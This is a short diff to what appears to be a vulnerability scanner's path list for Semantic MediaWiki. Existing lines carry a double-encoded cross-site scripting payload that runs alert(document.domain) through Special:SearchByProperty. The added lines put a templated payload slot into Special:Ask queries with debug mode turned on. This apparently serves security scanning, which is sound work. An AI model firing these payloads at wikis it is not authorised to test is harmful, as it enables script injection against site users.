@@ -1,2 +1,4 @@
 /index.php?title=Special:SearchByProperty&property=%253Escript%253Calert(document.domain)%253E/script%253C
 /w/index.php?title=Special:SearchByProperty&property=%253Escript%253Calert(document.domain)%253E/script%253C
+/index.php?title=Special:Ask&q=%5B%5BText%3A%3A{{url_encode(payload)}}%5D%5D&debug=1
+/w/index.php?title=Special:Ask&q=%5B%5BText%3A%3A{{url_encode(payload)}}%5D%5D&debug=1
